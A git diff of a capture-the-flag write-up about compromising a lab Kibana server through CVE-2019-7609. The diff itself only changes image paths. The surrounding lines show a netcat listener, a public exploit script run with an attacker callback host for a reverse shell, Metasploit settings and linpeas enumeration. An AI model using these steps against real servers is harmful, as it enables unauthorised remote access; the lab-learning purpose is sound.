@@ -25,7 +25,7 @@ http://kiba.thm:5601/app/timelion#
 ## Exploitation
 
 Useful resources about vulnerability:
--  https://github.com/LandGrey/CVE-2019-7609
+- https://github.com/LandGrey/CVE-2019-7609
 - https://github.com/mpgn/CVE-2019-7609
 
 For the exploitation phase we have two ways to compromise the target.
@@ -34,7 +34,7 @@ For the exploitation phase we have two ways to compromise the target.
 
 After a couple of research process, I discovered the vulnerability itself which is **Prototype Pollusion** on **Timelion** feature of the **Kibana** - ElasticSearch supported and opensource data visualization platform.
 
-![](729ac78be8e9db4f7c4fed3c058becbc.png)
+![](attachment/729ac78be8e9db4f7c4fed3c058becbc.png)
 
 
 Initial compromise:
@@ -52,7 +52,7 @@ nc -lvnp 1337
 
 
 Reverse Shell PoC:
-![](c01fde4a727b62e56d674dae6346ddbf.png)
+![](attachment/c01fde4a727b62e56d674dae6346ddbf.png)
 
 
 
@@ -83,20 +83,21 @@ python2 CVE-2019-7609-kibana-rce.py -u http://10.10.163.241:5601 -host 10.11.69.
 
 However, it did not call back on my machine. After on my first shot, I got break-time and turn on hybrid mode on my system. Therefore, I am going to refresh the machine.
 
-![](d24a174170333ddd84070e2414595cc2.png)![](eaaad08b9760b6b943ea9af458e1c8cd.png)
+![](attachment/d24a174170333ddd84070e2414595cc2.png)
 
+![](attachment/eaaad08b9760b6b943ea9af458e1c8cd.png)
 
 
 Now it works ! After I restarted the machine, I was able to get my reverse shell !
 
-![](11df5f7c7c9ac5dfcab4d51099732301.png)
+![](./attachment/11df5f7c7c9ac5dfcab4d51099732301.png)
 
 
 ### Automated Exploitation
 
 Metasploit Framework offers only three modules for **Kibana** platform. However, first approach was suitable for me. You can reach out the related module in below.
 
-![](c59ebbaa12eec0413d0a11bff25962e1.png)
+![](./attachment/c59ebbaa12eec0413d0a11bff25962e1.png)
 
 To interact with correlated module:
 
@@ -112,7 +113,7 @@ In order to show options required by the module, use the below command:
 show options
 ```
 
-![](c53a369d6204c98af36def3009c7b52d.png)
+![](./attachment/c53a369d6204c98af36def3009c7b52d.png)
 
 Modifying the *RHOSTS*, *TARGETURI* and *RPORT* is enough to execute our exploit.
 
@@ -126,7 +127,7 @@ Example: set RHOSTS or set RPORT
 
 For this scenario, do not forget to modify *RHOSTS*, *LHOST* and *LPORT*.
 
-![](a20b149b5028537d238919c11e7979b7.png)
+![](./attachment/a20b149b5028537d238919c11e7979b7.png)
 
 Since I forgot to give *LHOST* and *LPORT* option, I was not able to run the script appropriately.
 
@@ -152,7 +153,7 @@ chmod +x linpeas.sh
 4. Examine carefully  the linpeas output
 - I found really useful evidence to escalate our privileges
 
-![](93756ad44bea650fa9d6eff977b07209.png)
+![](./attachment/93756ad44bea650fa9d6eff977b07209.png)
 
 
 
